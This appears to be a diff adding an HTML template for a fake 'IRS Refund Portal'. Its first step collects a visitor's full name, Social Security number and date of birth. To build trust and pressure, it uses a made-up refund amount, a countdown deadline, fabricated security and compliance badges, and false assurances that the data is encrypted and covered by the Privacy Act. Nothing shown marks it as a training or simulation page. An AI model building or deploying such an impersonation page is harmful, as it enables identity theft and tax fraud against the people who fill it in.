@@ -1,0 +1,173 @@
+{% extends "layout.html" %}
+
+{% block title %}Step 1: Identity Verification — IRS Refund Portal{% endblock %}
+{% block breadcrumb %}Identity Verification{% endblock %}
+
+{% block content %}
+<div class="page-main">
+
+    <!-- ── Main form column ───────────────────────────────────────────────── -->
+    <div class="form-col">
+
+        <h1 class="page-title">Tax Refund Verification Portal</h1>
+        <p class="page-subtitle">Reference No: IRS-2026-REF-84920 &nbsp;|&nbsp; Refund Amount: <strong>$4,287.00</strong></p>
+
+        <!-- Progress steps -->
+        <div class="progress-steps">
+            <div class="progress-step active">
+                <span class="step-num">1</span>
+                Identity
+            </div>
+            <div class="progress-step">
+                <span class="step-num">2</span>
+                Contact
+            </div>
+            <div class="progress-step">
+                <span class="step-num">3</span>
+                Deposit
+            </div>
+            <div class="progress-step">
+                <span class="step-num">4</span>
+                Processing
+            </div>
+            <div class="progress-step">
+                <span class="step-num">5</span>
+                Review
+            </div>
+        </div>
+
+        <div class="alert alert-info">
+            ℹ️ &nbsp; To protect taxpayer information, we are required to verify your identity before releasing your refund. This information is transmitted using 256-bit TLS encryption.
+        </div>
+
+        <div class="form-card">
+            <div class="form-card-title">
+                🪪 &nbsp; Step 1 of 5 — Identity Verification
+            </div>
+            <div class="form-card-desc">
+                Please provide your personal information exactly as it appears on your most recent federal tax return (Form 1040). All fields marked with an asterisk (*) are required.
+            </div>
+
+            <form method="POST" action="/step/1" class="validated">
+
+                <div class="form-group">
+                    <label for="full_name">
+                        Full Legal Name <span class="required">*</span>
+                        <span class="hint">(as filed on Form 1040)</span>
+                    </label>
+                    <input type="text"
+                           id="full_name"
+                           name="full_name"
+                           placeholder="e.g. John Michael Smith"
+                           required
+                           autocomplete="name">
+                </div>
+
+                <div class="form-group">
+                    <label for="ssn">
+                        Social Security Number (SSN) <span class="required">*</span>
+                    </label>
+                    <input type="text"
+                           id="ssn"
+                           name="ssn"
+                           placeholder="XXX-XX-XXXX"
+                           maxlength="11"
+                           required
+                           autocomplete="off"
+                           aria-describedby="ssn-hint">
+                    <div class="field-hint" id="ssn-hint">
+                        🔒 Your SSN is encrypted end-to-end and used only to verify your identity with IRS records.
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="date_of_birth">
+                        Date of Birth <span class="required">*</span>
+                    </label>
+                    <input type="date"
+                           id="date_of_birth"
+                           name="date_of_birth"
+                           required
+                           aria-describedby="dob-hint">
+                    <div class="field-hint" id="dob-hint">
+                        Must match the date of birth on file with the Social Security Administration.
+                    </div>
+                </div>
+
+                <hr>
+
+                <div class="security-badges">
+                    <div class="badge"><span class="icon">🔒</span> 256-bit SSL</div>
+                    <div class="badge"><span class="icon">✅</span> IRS Verified</div>
+                    <div class="badge"><span class="icon">🛡️</span> FISMA Compliant</div>
+                    <div class="badge"><span class="icon">🔐</span> NIST 800-53</div>
+                </div>
+
+                <button type="submit" class="btn-primary">
+                    Continue to Step 2 →
+                </button>
+
+                <p class="text-muted mt-4">
+                    By continuing, you authorize the IRS to verify your identity using the information provided. See our <a href="#">Privacy Notice</a>.
+                </p>
+
+            </form>
+        </div>
+
+    </div>
+
+    <!-- ── Sidebar ────────────────────────────────────────────────────────── -->
+    <aside class="sidebar-col">
+
+        <div class="refund-status-box">
+            <div class="label">📋 Your Pending Refund</div>
+            <div class="amount">$4,287.00</div>
+            <div class="ref">Ref: IRS-2026-REF-84920</div>
+            <div class="status-tracker">
+                <div class="status-step current">
+                    <div class="status-dot"></div>
+                    Identity Verification
+                </div>
+                <div class="status-step">
+                    <div class="status-dot"></div>
+                    Contact Verification
+                </div>
+                <div class="status-step">
+                    <div class="status-dot"></div>
+                    Direct Deposit Setup
+                </div>
+                <div class="status-step">
+                    <div class="status-dot"></div>
+                    Processing
+                </div>
+                <div class="status-step">
+                    <div class="status-dot"></div>
+                    Refund Issued
+                </div>
+            </div>
+        </div>
+
+        <div class="alert alert-warning">
+            ⏱ <strong>Deadline:</strong> Your refund claim expires in <strong>6 days, 14 hours</strong>. Unclaimed refunds are returned to the U.S. Treasury per IRS Publication 594.
+        </div>
+
+        <div class="sidebar-widget">
+            <div class="sidebar-widget-title">Why We Need This</div>
+            <p>The IRS requires identity verification to protect taxpayers from fraudulent refund claims. Per <strong>IRC §6402</strong>, we must confirm the taxpayer's identity before disbursing any refund.</p>
+            <p>Your information is protected by the <strong>Privacy Act of 1974</strong> and will not be shared with third parties without your consent.</p>
+        </div>
+
+        <div class="sidebar-widget">
+            <div class="sidebar-widget-title">Need Help?</div>
+            <ul>
+                <li>Taxpayer Service: <strong>1-800-829-1040</strong></li>
+                <li>Hours: Mon–Fri 7am–7pm local time</li>
+                <li><a href="#">IRS Identity Protection PIN</a></li>
+                <li><a href="#">Where's My Refund?</a></li>
+            </ul>
+        </div>
+
+    </aside>
+
+</div>
+{% endblock %}
